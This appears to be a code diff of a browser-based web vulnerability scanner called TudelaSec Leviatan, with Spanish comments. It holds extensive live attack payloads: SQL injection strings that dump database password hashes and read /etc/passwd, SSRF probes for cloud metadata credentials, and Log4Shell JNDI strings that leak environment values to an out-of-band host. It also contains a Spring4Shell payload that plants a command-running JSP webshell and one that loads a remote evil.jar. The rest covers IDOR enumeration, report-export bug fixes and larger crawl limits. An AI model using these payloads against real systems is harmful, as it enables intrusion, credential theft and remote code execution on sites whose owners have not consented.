ING(database(),1,1)))>0,SLEEP(5),0)--',target+'/?id=1\' UNION SELECT user,password FROM mysql.user--',target+'/?id=1\' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema!=\'information_schema\'--',target+'/?id=1\' UNION SELECT column_name,data_type FROM information_schema.columns WHERE table_name=\'users\'--',target+'/?id=1;IF(1=1,SLEEP(5),0)--',target+'/?id=1\' AND IFNULL(SLEEP(5),0)--',target+'/?id=1\' AND EXP(~(SELECT * FROM (SELECT SLEEP(5))a))--',target+'/?id=1\' UNION SELECT schema_name FROM information_schema.schemata--',target+'/?id=1\' UNION SELECT user,authentication_string FROM mysql.user--',target+'/?id=1\' AND extractvalue(1,concat(0x7e,(SELECT version())))--',target+'/?id=1\' AND updatexml(1,concat(0x7e,(SELECT user())),1)--',target+'/?id=1;SELECT pg_sleep(5)--',target+'/?id=1\' UNION SELECT banner FROM v$version WHERE rownum=1--',target+'/?id=1\' UNION SELECT NULL,user_name FROM all_users--',target+'/?id=1;EXEC xp_cmdshell(\'whoami\')--',target+'/?id=1\' UNION SELECT name,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins--',target+'/?id=1\' UNION SELECT group_concat(schema_name) FROM information_schema.schemata--',target+'/?id=1\' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--',target+'/?id=1\' UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=\'users\'--',target+'/?id=1\' UNION SELECT group_concat(username,0x3a,password) FROM users--',target+'/?id=1\' UNION SELECT load_file(\'/etc/passwd\')--',target+'/?id=1\' UNION SELECT load_file(\'/proc/self/environ\')--',target+'/?id=1\' AND IF(@@version LIKE \'%MariaDB%\',SLEEP(5),0)--',target+'/?id=1\' AND IF((SELECT length(database()))>0,SLEEP(5),0)--',target+'/?id=1\' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'];
-for(var sb=0;sb<sqliBypass.length;sb++){var rsb=await get(sqliBypass[sb]);
-if(rsb&&rsb.ok&&rsb.body&&/error|warning|sql|syntax/i.test(rsb.body)){logErr('SQLi bypass exitoso: '+sqliBypass[sb].split('?')[1]);addF('high','SQLi WAF bypass','Bypass de WAF con encoding');markCrit('p131');break;}await sl(50);}
-logOk('SQLi bypass probado');
+var sqliBypassResults=await smartBatch(sqliBypass);
+var sqliBypassFound=false;
+for(var sb=0;sb<sqliBypassResults.length && !sqliBypassFound;sb++){
+if(sqliBypassResults[sb].status!=='fulfilled'||!sqliBypassResults[sb].value)continue;
+var rsb=sqliBypassResults[sb].value;
+if(rsb.ok&&rsb.body&&/error|warning|sql|syntax/i.test(rsb.body)){logErr('SQLi bypass exitoso: '+sqliBypass[sb].split('?')[1]);addF('high','SQLi WAF bypass','Bypass de WAF con encoding');markCrit('p131');sqliBypassFound=true;break;}
+}
+if(sqliBypassResults.pruned)logWarn('F131: cortado temprano tras 3 fallas consecutivas ('+sqliBypassResults.length+'/'+sqliBypass.length+' payloads probados)');
+logOk('SQLi bypass probado'+(sqliBypassFound?'':' — sin exito, '+sqliBypass.length+' payloads'));
 
 /* F132: mXSS */
 await tp(131);logSep('F132 — Mutation XSS');
@@ -18316,8 +18476,9 @@ var gcpMeta='http://metadata.google.internal/computeMetadata/v1/';
 var azureMeta='http://169.254.169.254/metadata/instance?api-version=2021-02-01';
 var ssrfParams=['?url=','?target=','?host=','?fetch=','?proxy=','?redirect=','?uri=','?path=','?src=','?dest=','?next=','?data=','?file=','?image=','?callback=','?reference='];
 var cloudPayloads=[awsMeta,awsMeta2,gcpMeta,azureMeta,'http://169.254.169.254/latest/user-data','http://169.254.169.254/latest/dynamic/instance-identity/document','http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token','http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01'];
+var cloudMDBaseline=await soft404Baseline(target);
 for(var cmi=0;cmi<ssrfParams.length;cmi++){for(var cmpi=0;cmpi<cloudPayloads.length;cmpi++){var rcm=await get(target+ssrfParams[cmi]+encodeURIComponent(cloudPayloads[cmpi]));
-if(rcm&&rcm.ok&&rcm.body){if(/ami-id|instance-id|security-credentials|AccessKeyId|SecretAccessKey|Token|instance-identity|service-accounts|oauth2/i.test(rcm.body)){logErr('CloudMD: metadata accesible via SSRF! ('+ssrfParams[cmi]+cloudPayloads[cmpi].slice(0,30)+')');addF('crit','Cloud Metadata SSRF','Metadata de cloud accesible: '+(rcm.body.slice(0,80)));markCrit('p240');cmF++;break;}}await sl(20);}
+if(rcm&&rcm.ok&&isRealCloudMetadata(rcm.body,cloudMDBaseline,rcm)){logErr('CloudMD: metadata accesible via SSRF! ('+ssrfParams[cmi]+cloudPayloads[cmpi].slice(0,30)+')');addF('crit','Cloud Metadata SSRF','Metadata de cloud accesible: '+(rcm.body.slice(0,80)));markCrit('p240');cmF++;break;}await sl(20);}
 if(cmF>0)break;}
 if(cmF===0)logOk('CloudMD: sin acceso a metadata');
 else logErr('CloudMD: '+cmF+' accesos confirmados');
@@ -19444,6 +19605,7 @@ await sl(100);
 /* F325: Log4Shell / JNDI RCE Detection (CVE-2021-44228) */
 await tp(322);logSep('F325 â Log4Shell / JNDI RCE Detection (CVE-2021-44228)');
 logInfo('Inyectando 30 payloads JNDI en headers, params y User-Agent...');
+if(isJavaIncompatibleStack()){logInfo('PRUNE (S.ctx): F325 omitida — stack PHP/WordPress confirmado, sin señal de Java');}else{
 var l4jF=0;
 var l4jPayloads=['${jndi:ldap://tudelasec.oob.test/a}','${jndi:rmi://tudelasec.oob.test/a}','${jndi:dns://tudelasec.oob.test/a}','${jndi:ldap://tudelasec.oob.test:1389/a}','${jndi:ldap://127.0.0.1:1389/a}','${::-jndi}','${${::-j}:${::-n}:${::-d}:${::-i}:ldap://tudelasec.oob.test/a}','${jndi:${lower:ld}ap://tudelasec.oob.test/a}','${jndi:${lower:l}${lower:d}ap://tudelasec.oob.test/a}','${jndi:${::-l}${::-d}${::-a}${::-p}://tudelasec.oob.test/a}','${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://tudelasec.oob.test/a}','${jndi:ldap://${sys:java.version}.tudelasec.oob.test/a}','${jndi:ldap://${env:HOSTNAME}.tudelasec.oob.test/a}','${jndi:ldap://${sys:user.dir}.tudelasec.oob.test/a}','${jndi:ldaps://tudelasec.oob.test/a}','${jndi:iiop://tudelasec.oob.test/a}','${jndi:corba://tudelasec.oob.test/a}','${jndi:nis://tudelasec.oob.test/a}','${jndi:nds://tudelasec.oob.test/a}','${jndi:vmi://tudelasec.oob.test/a}','x${jndi:ldap://tudelasec.oob.test/x}','${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://tudelasec.oob.test/x}','${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://tudelasec.oob.test/x}','${jndi:${lower:L}${lower:d}${lower:a}${lower:p}${lower:s}://tudelasec.oob.test/x}','${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//tudelasec.oob.test/a}','${jndi:${lower:l}${swap:a}p://tudelasec.oob.test/a}','${jndi:ldap://${env:USER}.tudelasec.oob.test/a}','${jndi:ldap://${env:AWS_REGION}.tudelasec.oob.test/a}','${jndi:ldap://${sys:os.name}.tudelasec.oob.test/a}','${jndi:ldap://${sys:os.arch}.tudelasec.oob.test/a}','${jndi:ldap://${java:os}.tudelasec.oob.test/a}'];
 var l4jHeaders=['X-Forwarded-For','X-Api-Version','X-Client-IP','User-Agent','Referer','X-Forwarded-Host','X-Forwarded-Proto','Accept-Language','X-Real-IP','True-Client-IP','X-Originating-IP','X-Remote-IP','X-Client-IP','X-Forwarded','Forwarded','X-WAP-Profile','X-Device-ID','CF-Connecting_IP','X-Original-URL','X-Rewrite-URL'];
@@ -19454,14 +19616,9 @@ for(var l4h=0;l4h<l4jHeaders.length&&l4jTested<80;l4h++){
 var hdr={};hdr[l4jHeaders[l4h]]=l4jPayloads[l4h%l4jPayloads.length];
 var r1=await pfx(target,{method:'GET',headers:hdr});
 l4jTested++;
-if(r1&&r1.ok&&/jndi|javax.naming|ldap|rmi|Referenceable|ObjectFactory/i.test(r1.body||'')){
-logCrit('LOG4SHELL RCE: header '+l4jHeaders[l4h]+' refleja JNDI! CVE-2021-44228 CONFIRMADO');
-addF('crit','Log4Shell RCE (CVE-2021-44228)','Header '+l4jHeaders[l4h]+' vulnerable a JNDI injection â RCE remoto via Log4j');
-markCrit('p326');l4jF++;break;
-}
-if(r1&&r1.ok&&/\${.*jndi.*}|\${.*lower.*}|\${.*sys.*}|\${.*env.*}/i.test(r1.body||'')){
-logErr('Log4Shell: header '+l4jHeaders[l4h]+' refleja expresion Log4j!');
-addF('high','Log4Shell Expression Leak','Header '+l4jHeaders[l4h]+' refleja ${} expressions â Log4j vulnerable');
+if(r1&&r1.ok&&/javax\.naming\.(Naming|CommFailure)Exception|com\.sun\.jndi\.(ldap|rmi)|LDAP:\s*error code|java\.rmi\.ConnectException.*jndi/i.test(r1.body||'')){
+logCrit('LOG4SHELL RCE: header '+l4jHeaders[l4h]+' — excepcion Java de JNDI real detectada! CVE-2021-44228 CONFIRMADO');
+addF('crit','Log4Shell RCE (CVE-2021-44228)','Header '+l4jHeaders[l4h]+' vulnerable a JNDI injection — evidencia de excepcion Java real');
 markCrit('p326');l4jF++;break;
 }
 await sl(6);
@@ -19470,34 +19627,34 @@ for(var l4p=0;l4p<l4jParams.length&&l4jF===0&&l4jTested<120;l4p++){
 for(var l4pi=0;l4pi<5&&l4jTested<120;l4pi++){
 var r2=await get(target+l4jPaths[l4p%l4jPaths.length]+l4jParams[l4p]+uenc(l4jPayloads[(l4p+l4pi)%l4jPayloads.length]));
 l4jTested++;
-if(r2&&r2.ok&&/jndi|javax.naming|ldap|Referenceable/i.test(r2.body||'')){
-logCrit('LOG4SHELL RCE: param '+l4jParams[l4p]+' refleja JNDI! CVE-2021-44228');
-addF('crit','Log4Shell RCE via Param (CVE-2021-44228)','Param '+l4jParams[l4p]+' vulnerable a JNDI injection â RCE remoto');
+if(r2&&r2.ok&&/javax\.naming\.(Naming|CommFailure)Exception|com\.sun\.jndi\.(ldap|rmi)|LDAP:\s*error code/i.test(r2.body||'')){
+logCrit('LOG4SHELL RCE: param '+l4jParams[l4p]+' — excepcion Java de JNDI real detectada! CVE-2021-44228');
+addF('crit','Log4Shell RCE via Param (CVE-2021-44228)','Param '+l4jParams[l4p]+' vulnerable a JNDI injection — evidencia de excepcion Java real');
 markCrit('p326');l4jF++;break;
 }
 await sl(6);
 }
 if(l4jF>0)break;
 }
-if(l4jF===0)logOk('Log4Shell: sin refleccion JNDI detectada ('+l4jTested+' pruebas)');
+if(l4jF===0)logOk('Log4Shell: sin evidencia de RCE JNDI real ('+l4jTested+' pruebas, firma estricta)');
 else logCrit('Log4Shell: '+l4jF+' vectores vulnerables a RCE JNDI!');
 await sl(100);
+}
 
 /* F326: Spring4Shell Detection (CVE-2022-22965) */
 await tp(323);logSep('F326 â Spring4Shell Detection (CVE-2022-22965)');
 logInfo('Probando ClassLoader manipulation en Spring Boot...');
+if(isJavaIncompatibleStack()){logInfo('PRUNE (S.ctx): F326 omitida — stack PHP/WordPress confirmado, sin señal de Java/Spring');}else{
 var s4sF=0;
 var s4sPaths=['/','/api','/api/v1','/login','/api/login','/api/v1/login','/admin','/api/admin','/api/v1/admin','/error','/api/error','/actuator','/api/actuator','/h2-console','/console'];
 var s4sPayloads=['class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream();%20int%20a%20%3D%20-1;%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D;%20out.print(%22%3Cpre%3E%22);%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b));%20%7D%20out.print(%22%3C/pre%3E%22);%20%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tudelasec&class.module.classLoader.resources.context.parent.pipeline.first.file.dateformat=yyyy-MM-dd','class.module.classLoader=org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedWebappClassLoader','class.classLoader=org.springframework.boot.loader.LaunchedURLClassLoader','class.module.classLoader.URLs%5B0%5D=http://tudelasec.oob.test/evil.jar','class.module.classLoader.resources.context.manager=java.lang.Runtime','class.module.classLoader.resources.context.parent.pipeline.first.pattern=tudelasec'];
 for(var s4i=0;s4i<s4sPaths.length;s4i++){
 for(var s4j=0;s4j<s4sPayloads.length;s4j++){
 var rs4=await get(target+s4sPaths[s4i]+'?'+s4sPayloads[s4j].slice(0,200));
-if(rs4&&rs4.ok){
-if(/tudelasec|webapps|TomcatEmbeddedWebappClassLoader|LaunchedURLClassLoader|class.module/i.test(rs4.body||'')){
-logCrit('SPRING4SHELL RCE: CVE-2022-22965 confirmado en '+s4sPaths[s4i]);
-addF('crit','Spring4Shell RCE (CVE-2022-22965)','ClassLoader manipulation detectada â RCE via Spring Framework');
+if(rs4&&rs4.ok&&isRealCommandOutput(rs4.body||'')){
+logCrit('SPRING4SHELL RCE: CVE-2022-22965 confirmado en '+s4sPaths[s4i]+' — salida de comando real detectada');
+addF('crit','Spring4Shell RCE (CVE-2022-22965)','ClassLoader manipulation detectada — evidencia de ejecucion real, no solo eco del payload');
 markCrit('p327');s4sF++;break;
-}
 }
 await sl(8);
 }
@@ -19510,9 +19667,10 @@ logWarn('Spring Boot detectado â verificar version vulnerable a CVE-2022-22
 addF('high','Spring Boot Detection','Spring Boot detectado â CVE-2022-22965 posible dependiendo de version');
 }
 }
-if(s4sF===0)logOk('Spring4Shell: sin explotacion CVE-2022-22965');
+if(s4sF===0)logOk('Spring4Shell: sin evidencia de RCE real ('+ s4sPaths.length +' rutas, firma estricta)');
 else logCrit('Spring4Shell: RCE confirmada en '+s4sF+' endpoints!');
 await sl(100);
+}
 
 /* F327: Subdomain CNAME Takeover (50+ fingerprints) */
 await tp(324);logSep('F327 â Subdomain CNAME Takeover (50+ fingerprints)');
@@ -19927,6 +20085,7 @@ await sl(100);
 /* F335: Fortinet FortiGate CVE Detection (CVE-2024-21762, CVE-2023-27997) */
 await tp(332);logSep('F335 â Fortinet FortiGate CVE Detection (CVE-2024-21762 + CVE-2023-27997)');
 logInfo('Detectando FortiOS y CVEs criticos de FortiGate...');
+if(isJavaIncompatibleStack()){logInfo('PRUNE (S.ctx): F335 omitida — stack PHP/WordPress confirmado, incompatible con appliance FortiGate');}else{
 var fortF=0;
 var fortPaths=['/remote/fgt_lang','/remote/login','/remote/info','/api/v2/cmdb/system/status','/login','/sslvpn/login.html','/remote/saml/login','/api/v2/','/fpc/app','/magic404','/remote/error','/remote/logout','/remote/spn_logout','/logincheck','/api/v2/monitor/system/firmware'];
 var fortSignatures=['FortiGate','FortiOS','FortiToken','Fortinet','fgt_lang','sslvpn','FortiClient','FortiManager','sslvpn_login'];
@@ -19967,10 +20126,12 @@ markCrit('p336');fortF++;
 if(fortF===0)logOk('FortiGate: no detectado');
 else logCrit('FortiGate: '+fortF+' indicadores CVE detectados!');
 await sl(100);
+}
 
 /* F336: F5 BIG-IP CVE Detection (CVE-2023-4622, RCE via mgmt) */
 await tp(333);logSep('F336 â F5 BIG-IP CVE Detection (CVE-2023-4622 + RCE)');
 logInfo('Detectando F5 BIG-IP y CVEs criticos...');
+if(isJavaIncompatibleStack()){logInfo('PRUNE (S.ctx): F336 omitida — stack PHP/WordPress confirmado, incompatible con appliance F5 BIG-IP');}else{
 var f5F=0;
 var f5Paths=['/tmui/login.jsp','/tmui/','/mgmt/tm/util','/mgmt/tm/auth','/iControl/iControlPortal.py','/tmui/tmui/locallb/workspace/fileRead.jsp','/tmui/tmui/locallb/workspace/tmshCmd.jsp','/hsqldb','/xui','/ui/login','/login.jsp','/tmui/system/','/f5-ihealth','/mgmt/shared/','/mgmt/tm/sys/version','/sam/admin/php/tm.php'];
 var f5Signatures=['BIG-IP','F5 Networks','BIGIP','iControl','tmui','F5 TMOS','iWorkflow','load balancer','BIG-IPÂ®','F5 BIG-IP'];
@@ -20011,6 +20172,7 @@ markCrit('p337');f5F++;
 if(f5F===0)logOk('F5 BIG-IP: no detectado');
 else logCrit('F5 BIG-IP: '+f5F+' indicadores CVE detectados!');
 await sl(100);
+}
 
 /* F337: Cloud IAM Exploitation (AWS STS, GCP, Azure) */
 await tp(334);logSep('F337 â Cloud IAM Exploitation (AWS STS/GCP/Azure)');
@@ -20748,7 +20910,13 @@ buildP();
 var pdfBtn=document.getElementById('scan-pdf-btn');
 if(pdfBtn)pdfBtn.addEventListener('click',function(){
 var rpt=window.open('','_blank');
-if(!rpt)return;
+if(!rpt){
+/* Antes: si el navegador bloqueaba el popup, esto retornaba en silencio — el usuario
+   clickeaba PDF y no pasaba nada, sin ninguna explicacion. */
+if(typeof showToast==='function')showToast('Bloqueado','Tu navegador bloqueo la ventana emergente. Permiti popups para este sitio y volve a intentar.','danger',6000);
+else alert('Tu navegador bloqueo la ventana emergente. Permiti popups para este sitio y volve a intentar.');
+return;
+}
 var dt=new Date().toISOString().split('T')[0];
 var tm=new Date().toLocaleTimeString();
 var total=counts.crit+counts.high+counts.med+counts.low;
@@ -20762,6 +20930,16 @@ var owaspMap={'XSS':'A03:2021 Injection','SQLi':'A03:2021 Injection','SQL Inject
 var owaspCounts={};
 var cards=findings.querySelectorAll('.sf-card');
 cards.forEach(function(c){var name=(c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'');var matched=false;Object.keys(owaspMap).forEach(function(k){if(name.indexOf(k)>=0&&!matched){var cat=owaspMap[k];owaspCounts[cat]=(owaspCounts[cat]||0)+1;matched=true;}});});
+/* Bug real: mitreMap/mitreCounts y pciMap/pciCounts NUNCA se redeclaraban aca (a diferencia
+   de owaspMap/owaspCounts, que si se copiaban localmente) — el HTML del PDF los referenciaba
+   mas abajo asumiendo que existian, y crasheaba con "mitreCounts is not defined" apenas se
+   generaba el reporte, incluso con el popup permitido. */
+var mitreMap={'RCE':'T1059 Command Execution','Command Injection':'T1059 Command Execution','SQL Injection':'T1190 Exploit Public App','SQLi':'T1190 Exploit Public App','XSS':'T1056 Input Capture','SSRF':'T1190 Exploit Public App','XXE':'T1190 Exploit Public App','SSTI':'T1190 Exploit Public App','Path Traversal':'T1083 File Discovery','LFI':'T1083 File Discovery','Subdomain Takeover':'T1566 Phishing','Credential Stuffing':'T1110 Brute Force','Default Creds':'T1078 Valid Accounts','JWT':'T1552 Unsecured Credentials','OAuth':'T1556 Modify Auth Process','WAF Bypass':'T1027 Obfuscated Files','Log4Shell':'T1190 Exploit Public App','Spring4Shell':'T1190 Exploit Public App','Cloud':'T1539 Steal Cloud Creds','Docker':'T1611 Escape to Host','K8s':'T1611 Escape to Host','Secret':'T1552 Unsecured Credentials'};
+var mitreCounts={};
+cards.forEach(function(c){var name=(c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'');var matched2=false;Object.keys(mitreMap).forEach(function(k){if(name.indexOf(k)>=0&&!matched2){var tac=mitreMap[k];mitreCounts[tac]=(mitreCounts[tac]||0)+1;matched2=true;}});});
+var pciMap={'SQL Injection':'PCI 6.5.1','XSS':'PCI 6.5.7','RCE':'PCI 6.5.3','Path Traversal':'PCI 6.5.8','SSRF':'PCI 6.5.1','Auth Bypass':'PCI 6.5.10','Session':'PCI 6.5.8','CSRF':'PCI 6.5.9','Secret':'PCI 3.2.1','TLS':'PCI 4.1','WAF':'PCI 6.6'};
+var pciCounts={};
+cards.forEach(function(c){var name=(c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'');Object.keys(pciMap).forEach(function(k){if(name.indexOf(k)>=0){pciCounts[pciMap[k]]=(pciCounts[pciMap[k]]||0)+1;}});});
 /* Terminal log capture */
 var termLogs=termBody.querySelectorAll('.scan-ln');
 var termHtml='';
@@ -20770,6 +20948,8 @@ termLogs.forEach(function(ln){var cls=ln.className.replace('scan-ln ','').trim()
 var cveCards=Array.from(cards).filter(function(c){var n=c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'';return /CVE-/.test(n);});
 /* Chain findings */
 var chainCards=Array.from(cards).filter(function(c){var n=c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'';return /Chain/.test(n);});
+/* Secret findings (faltaba esta tambien, mismo bug de copia incompleta) */
+var secretCards=Array.from(cards).filter(function(c){var n=c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'';return /Secret|Key|Token|Password|AWS|GCP|Azure|JWT|Stripe|GitHub|Slack|Google|Private Key/i.test(n);});
 /* Build HTML */
 var html='<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>TudelaSec Leviatan v9.0 — Reporte de Auditoria</title>';
 html+='<style>';
@@ -20922,6 +21102,7 @@ setTimeout(function(){rpt.print();},500);
 /* === SARIF Export === */
 var sarifBtn=document.getElementById('scan-sarif-btn');
 if(sarifBtn)sarifBtn.addEventListener('click',function(){
+var target=((document.getElementById('scan-input')||{}).value||'').trim();if(target&&!/^https?:\/\//i.test(target))target='https://'+target;var h;try{h=new URL(target).hostname;}catch(e0){h=target.replace(/[^a-z0-9.]/gi,'')||'target';}
 var sarifResults=[];var cards2=findings.querySelectorAll('.sf-card');
 cards2.forEach(function(c,idx){var sev=c.className.split(' ').filter(function(s){return['crit','high','med','low'].indexOf(s)>-1;})[0]||'low';var name=c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'Unknown';var detail=c.querySelector('.sf-detail')?c.querySelector('.sf-detail').textContent:'';var sarifLevel={crit:'error',high:'error',med:'warning',low:'note'}[sev];
 sarifResults.push({ruleId:name,level:sarifLevel,message:{text:detail},locations:[{physicalLocation:{artifactLocation:{uri:target},region:{startLine:1}}}],partialFingerprints:{primaryLocationLineHash:idx+'_'+name}});});
@@ -20932,6 +21113,7 @@ var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='l
 /* === OpenAPI Export === */
 var openapiBtn=document.getElementById('scan-openapi-btn');
 if(openapiBtn)openapiBtn.addEventListener('click',function(){
+var target=((document.getElementById('scan-input')||{}).value||'').trim();if(target&&!/^https?:\/\//i.test(target))target='https://'+target;var h;try{h=new URL(target).hostname;}catch(e0){h=target.replace(/[^a-z0-9.]/gi,'')||'target';}
 S.openapi.info={title:h,version:'1.0',description:'OpenAPI schema reconstructed by TudelaSec Leviatan v9.0'};
 var blob=new Blob([JSON.stringify(S.openapi,null,2)],{type:'application/json'});
 var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='leviatan-'+h.replace(/[^a-z0-9]/gi,'_')+'-openapi.json';a.click();URL.revokeObjectURL(a.href);
@@ -20939,6 +21121,7 @@ var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='l
 /* === HAR Export === */
 var harBtn=document.getElementById('scan-har-btn');
 if(harBtn)harBtn.addEventListener('click',function(){
+var target=((document.getElementById('scan-input')||{}).value||'').trim();if(target&&!/^https?:\/\//i.test(target))target='https://'+target;var h;try{h=new URL(target).hostname;}catch(e0){h=target.replace(/[^a-z0-9.]/gi,'')||'target';}
 var harEntries=[];var cards3=findings.querySelectorAll('.sf-card');
 cards3.forEach(function(c){var sev=c.className.split(' ').filter(function(s){return['crit','high','med','low'].indexOf(s)>-1;})[0]||'low';var name=c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'';var detail=c.querySelector('.sf-detail')?c.querySelector('.sf-detail').textContent:'';
 harEntries.push({request:{method:'GET',url:target,headers:[{name:'User-Agent',value:'TudelaSec-Leviatan-v9'}]},response:{status:200,statusText:'OK',content:{text:detail,mimeType:'text/html'}},startedDateTime:new Date().toISOString(),time:0,_comment:name+' ['+sev+']'});});
@@ -20950,6 +21133,7 @@ var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='l
 /* === cURL Commands Export === */
 var curlBtn=document.getElementById('scan-curl-btn');
 if(curlBtn)curlBtn.addEventListener('click',function(){
+var target=((document.getElementById('scan-input')||{}).value||'').trim();if(target&&!/^https?:\/\//i.test(target))target='https://'+target;var h;try{h=new URL(target).hostname;}catch(e0){h=target.replace(/[^a-z0-9.]/gi,'')||'target';}
 var curlText='#!/bin/bash\n# TudelaSec Leviatan v9.0 - Comandos cURL para reproducir hallazgos\n# Target: '+target+'\n# Generado: '+new Date().toISOString()+'\n\n';
 if(S.curlCmds&&S.curlCmds.length>0){S.curlCmds.forEach(function(c){curlText+='# '+c.name+'\n'+c.cmd+'\n\n';});}
 else{var cards4=findings.querySelectorAll('.sf-card');cards4.forEach(function(c){var sev=c.className.split(' ').filter(function(s){return['crit','high','med','low'].indexOf(s)>-1;})[0]||'low';var name=c.querySelector('.sf-name')?c.querySelector('.sf-name').textContent:'';if(sev==='crit'||sev==='high')curlText+='# ['+sev.toUpperCase()+'] '+name+'\ncurl -X GET "'+target+'"\n\n';});}
@@ -21391,21 +21575,41 @@ async function crwCheckSourceMap(jsUrl, jsCode){
    SOLO a partir de patrones /api/.../ realmente encontrados en este target puntual.
    Si se descubrio /api/v1/users, se prueban /api/v1/{admin,config,debug,...} — mucho
    mas dirigido que fuzzear a ciegas, porque nace de lo que el target YA demostro tener. */
-var CRW_MUTATION_SUFFIXES = ['admin','config','settings','debug','health','status','docs','swagger','schema','test','internal','backup','users','me','stats','metrics'];
+var CRW_MUTATION_SUFFIXES = ['admin','config','settings','debug','health','status','docs','swagger','schema','test','internal','backup','users','me','stats','metrics','logs','console','dashboard','private','v1','v2','v3','export','import','upload','download','session','token','key','secret','env','all','list','search','query','graphql','openapi.json','swagger.json'];
 function crwGenerateMutations(discoveredUrls, origin){
   var basePaths = new Set();
+  var idPatterns = [];
   discoveredUrls.forEach(function(u){
     if(!/\/api\/|\/v[0-9]+\//i.test(u)) return;
     try{
       var segs = new URL(u).pathname.split('/').filter(Boolean);
-      if(segs.length>0){ segs.pop(); basePaths.add('/'+segs.join('/')); }
+      if(segs.length>0){
+        var last = segs[segs.length-1];
+        /* Deteccion de ID numerico al final del path — candidato directo a IDOR.
+           /api/v1/users/5 -> se prueban los IDs vecinos (1..15) sobre el mismo path. */
+        if(/^[0-9]+$/.test(last) && segs.length>1){
+          var base = segs.slice(0,-1).join('/');
+          idPatterns.push({ base: base, seen: parseInt(last,10) });
+        }
+        segs.pop(); basePaths.add('/'+segs.join('/'));
+      }
     }catch(e){}
   });
   var mutations = [];
   basePaths.forEach(function(base){
     CRW_MUTATION_SUFFIXES.forEach(function(suf){ mutations.push(origin+base+'/'+suf); });
   });
-  return Array.from(new Set(mutations)).slice(0,150);
+  /* IDOR numerico: por cada patron .../123 encontrado, probar 1..15 y un rango
+     alrededor del ID real visto (real-5 .. real+5), que suele ser mas revelador
+     que arrancar siempre desde 1 en sistemas con IDs viejos/nuevos mezclados. */
+  var idBasesSeen = {};
+  idPatterns.forEach(function(ip){
+    if(idBasesSeen[ip.base]) return;
+    idBasesSeen[ip.base] = true;
+    for(var n=1;n<=15;n++){ mutations.push(origin+'/'+ip.base+'/'+n); }
+    for(var d=-5;d<=5;d++){ var candidate=ip.seen+d; if(candidate>0) mutations.push(origin+'/'+ip.base+'/'+candidate); }
+  });
+  return Array.from(new Set(mutations)).slice(0,700);
 }
 
 /* Parametros de query unicos vistos en toda la corrida — insumo directo para fuzzing
@@ -21434,8 +21638,8 @@ async function runCrawler(startUrl, maxDepth){
   var forms = [];
   var external = {};
   var allInlineJS = [];
-  var maxPages = 60;
-  var concurrency = 6;
+  var maxPages = 300;
+  var concurrency = 14;
 
   /* Fase 0: semillas pasivas (robots.txt + sitemap.xml) antes de gastar presupuesto
      de crawling activo — mismo orden de prioridad que el OSINT: lo pasivo primero. */
@@ -21484,13 +21688,13 @@ async function runCrawler(startUrl, maxDepth){
       ext.external.forEach(function(e){ external[e] = true; });
       ext.inlineJS.forEach(function(js){ allInlineJS.push({ code: js, baseUrl: item.url }); });
     }
-    if(consecutiveDead >= 8) break;
+    if(consecutiveDead >= 25) break;
   }
 
   /* Fase 2: JS externos + inline -> endpoints ocultos, y deteccion de source maps
      (revelan la estructura original del proyecto antes de minificar/compilar). */
   statusText.textContent = 'Parseando '+Object.keys(jsFiles).length+' archivos JS + scripts inline...';
-  var jsUrls = Object.keys(jsFiles).slice(0, 40);
+  var jsUrls = Object.keys(jsFiles).slice(0, 150);
   var jsEndpoints = {};
   var jsResults = await Promise.allSettled(jsUrls.map(function(u){ return crwFetch(u); }));
   var jsBodies = [];
@@ -21507,7 +21711,7 @@ async function runCrawler(startUrl, maxDepth){
 
   statusText.textContent = 'Buscando source maps...';
   progFill.style.width = '80%';
-  var smResults = await Promise.allSettled(jsBodies.slice(0,15).map(function(jb){ return crwCheckSourceMap(jb.url, jb.code); }));
+  var smResults = await Promise.allSettled(jsBodies.slice(0,50).map(function(jb){ return crwCheckSourceMap(jb.url, jb.code); }));
   var sourceMapFindings = [];
   smResults.forEach(function(r){ if(r.status==='fulfilled' && r.value) sourceMapFindings.push(r.value); });
 
@@ -21520,7 +21724,7 @@ async function runCrawler(startUrl, maxDepth){
     statusText.textContent = 'Probando '+mutations.length+' mutaciones inteligentes derivadas de patrones API...';
     progFill.style.width = '90%';
     var mutDead = 0;
-    for(var mb=0; mb<mutations.length && mutDead<3; mb+=concurrency){
+    for(var mb=0; mb<mutations.length && mutDead<5; mb+=concurrency){
       var mutBatch = mutations.slice(mb, mb+concurrency);
       var mutSettled = await Promise.allSettled(mutBatch.map(function(u){ return crwFetch(u); }));
       var batchAllDead = true;
